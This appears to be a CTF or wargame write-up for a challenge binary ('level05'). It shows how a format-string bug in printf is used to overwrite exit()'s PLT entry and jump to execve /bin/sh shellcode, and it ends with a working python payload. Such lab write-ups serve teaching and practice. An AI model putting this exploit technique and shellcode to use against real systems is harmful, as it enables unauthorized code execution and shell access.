
# Overview

This binary takes an input string, de-capitalizes it (A-Z->a-z) and calls printf() with this string.

# Vulnerability

There is an unprotected printf() that can read and write to anywhere in the memory.

# Exploit

- We cannot use a ret-2-libc exploit here, because there is no return(), exit() is called directly.

- We can, however, overwrite exit()'s address in the memory (PLT, process linkage table).

# Payload design

Considerations:

1. Shellcode needs to be at a predictable address.
2. We also need to put the destination address somewhere close to the beginning of the input string

Result:
[destination address] [printf conversions] [shellcode]

# Payload development

## Printf aiming

First, let's make printf target the first 8 bytes of the string:

"aaaabbbb %p %p %p %p..." put %p's or %42$p's until %p gives you 61616161 62626262

You can see from the source that the string is at $esp + 0x28 (dec 40), so it should be around 10th %p or %10$p.

Now we know that the payload is going to be something around:

[target address][inflating printf return][highest byte write][inflating more][lowest byte write]
aaaa bbbb       %4242x                   %10$hn              %4242x          %11$hn

## Finding out the address of the shellcode

Let's now roughly construct the payload string, so that we can find out the address we're going to redirect to.


-------------------------------------------------------------------| this is what we're going to be looking for 
                                                                   \/
python -c 'print("aaaabbbb" + "%4242x %10$hn %4242x %11$hn " + "ccccdddd")' > /tmp/e5

Break at *main+195 and run < /tmp/e5

With this we seem to land at 0xffffd67c

## Finding the address of exit() in PLT

Either look up the PLT in using objdump -R (for -Relocation records), or look around in gdb.

The target is: 

0x080497e0

## What we know now

----------------------------------------------|   address of exit in PLT (target), first two bytes, then two more bytes
                                              \/
python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%4242x %10$hn %4242x %11$hn " + "ccccdddd")' > /tmp/e5
                                                                                               /\
-----------------------------------------------------------------------------------------------|    this (value) not known yet

## Let's calculate the printf value

The value we want to write is 0xffffd67c. We want to write it in two chunks:

0xd67c and 0xffff

We've given printf two targets (exit's lower 2 bytes and higher two bytes).

The first value is the lower bytes, 0xd67c. We need to inflate printf's return to this value.

By the time we reach the conversions, we've already written 8 bytes (two 4-byte addresses).

So the value should be 0xd67c - 8 = 54900

By the time we reach the second conversion, we've already written the first value (0xd67c, or 54900), so we need to inflate
the return value to 0xffff - 54900 or 0xffff - 0xd67c = 10627


## What do we have now
python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54900x %10$hn %10627x %11$hn " + "ccccdddd")' > /tmp/e5


## Add shellcode

Let's try this one:  https://shell-storm.org/shellcode/files/shellcode-575.html


\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80


## Tailor the address

Now that we have an almost-ready payload, go to gdb again and make sure your target value is still aiming at the first byte of the shellcode.

## Understand that life is pain

Now we remember that the code will de-capitalize (change) all bytes in your shellcode between 41 and 5a.

## Find hope again

Remember that the code uses strlen so it will stop at \0. Isolate your shellcode with a \x00, and add two spaces for good measure.

## Result

python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54900x%10$hn%10627x%11$hn  \x00" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")' > /tmp/e5

## Tweak again

If you look at gdb now, and 

```
unset env LINES
unset env COLUMNS
```

Also make sure to launch gdb with env - gdb /home/users/level05 -- this way the environment (environment pointer, argc/argv etc.) will be as close as possible to the runtime environment.
We're aiming at an address on the stack, so we need our addresses to be dialed in on the real addresses / stack pointer.

the shellcode now lives at 0xffffd67f. We need to tweak the first printf inflation value:

value1 = 0xd69d - 8 = 54903

value2 = 0xffff - 0xd69d = 10624

## Go back to the world of hurt

The resulting shellcode still doesn't work. We're noticing that the code segfaults.

We figure out that the kernel writes segfault messages here:

```
dmesg
```

The kernel also prints out the real stack pointer!

```
[ 1001.641233] level05[1869]: segfault at b ip 00000000ffffde09 sp 00000000ffffddbc error 6
```

We know the address we want to jump to is at $esp + 0x27 + 36 (for our formatting directives etc).

```python3
>>> hex(0xffffddbc + 0x4a)
'0xffffde06'
```

Now redirect the exploit to this address

## Still doesn't work

It looks like we're close. We've tried adding 1-3 bytes and it finally worked!


## The final payload

python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%56830x%10$hn%8697x%11$hn\x00" +  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")' > /tmp/e5